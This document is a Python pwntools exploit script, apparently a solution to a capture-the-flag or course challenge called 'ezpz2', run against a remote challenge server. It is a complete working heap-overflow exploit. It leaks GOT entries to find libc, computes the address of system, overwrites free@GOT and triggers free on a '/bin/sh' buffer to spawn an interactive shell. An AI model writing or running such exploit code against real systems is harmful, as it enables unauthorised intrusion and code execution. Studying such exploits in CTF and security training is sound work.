#!/usr/bin/python3

'''
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
'''

"""
:: set_question
fgets(*(eax+0x18), 0x78, stdin)
"""

from pwn import *

# p = process("./ezpz2")
p = remote("plsdonthaq.me", 7002)

bin_addr = {
    "puts@GOT": 0x804b02c,
    "free@GOT": 0x804b018,
    "getchar@GOT": 0x804b01c,
    "fgets@GOT": 0x804b020
}

libc_addr = dict()

wait = lambda: p.recvuntil("Enter your choice, (or press enter to refresh): ")

def create(*, flush=True):
    p.sendline("C")
    if flush: wait()

def delete(id, *, flush=True):
    p.sendline("D")
    p.sendline(str(id))
    if flush: wait()

def set(id, str_0x78, *, flush=True):
    p.sendline("S")
    p.sendline(str(id))
    p.sendline(str_0x78)
    if flush: wait()

def ask(id, *, flush=True):
    p.sendline("A")
    p.sendline(str(id))
    if flush: wait()

#######

wait()

# Create and delete ID 0, so that `free@GOT` is initialised
create()
delete(0)

# Create ID 1 and 2
create()
create()

set(2, "B" * 0x8) # Populate ID 2 for debugging purposes

def leak(func):
    payload = b''

    # Fill in the content of buffer[0]
    payload += b'A' * 0x18
    payload += b'\x00' * 4

    # Overflow buffer[0] to container[1]
    payload += p32(0x00000021)
    payload += b'\x00' * 0x18
    payload += p32(bin_addr[func + "@GOT"])   # Address to leak contents from
    payload += p32(0x00000021)                # Since fgets() appends an 0x0a at the end of the input
                                              # Preserve the chunk size header, and let fgets() overwrite buffer[1]
    set(1, payload)  # Write the payload

    # Now leak the contents
    ask(2, flush=False)
    p.recvuntil("I have the answer perhaps: '")
    libc_addr[func] = u32(p.recv(4)) # Store it into a dictionary

    wait()
    return libc_addr[func]

# Leak the libc addresses of `puts` and `free`
leak("puts")  # In my run I got: 0xf7dd9b40  
leak("free")  # In my run I got: 0xf7ded250
'''
Using `vmmap`, the base of libc was at 0xf7d72000

puts offset is 0x67b40
free offset is 0x7b250

These offsets match libc6_2.27-3ubuntu1_i386
'''

# Store the address of libc6_2.27-3ubuntu1_i386's `system`  function
libc_addr["system"] = libc_addr["puts"] - 0x2a940

"""
Now we want to override the address that `free@GOT` points to
As fgets() writes an 0x0a after input, we'll also leak getchar@GOT and fgets@GOT to keep their values
"""

leak("getchar") # Leak getchar
leak("fgets")   # Leak fgets
leak("free")    # re-leak free - Change the buffer address for ID 2 to point to free@GOT

# Payload to overwrite free@GOT
payload = b''
payload += p32(libc_addr["system"])
payload += p32(libc_addr["getchar"])
payload += p32(libc_addr["fgets"])
set(2, payload)

# Set the contents of buffer 1 to /bin/sh\0
set(1, "/bin/sh\0")

# Now call delete_question on question 1
# free (instruction at delete_question::0x8048922)
delete(1, flush=False)

p.interactive()


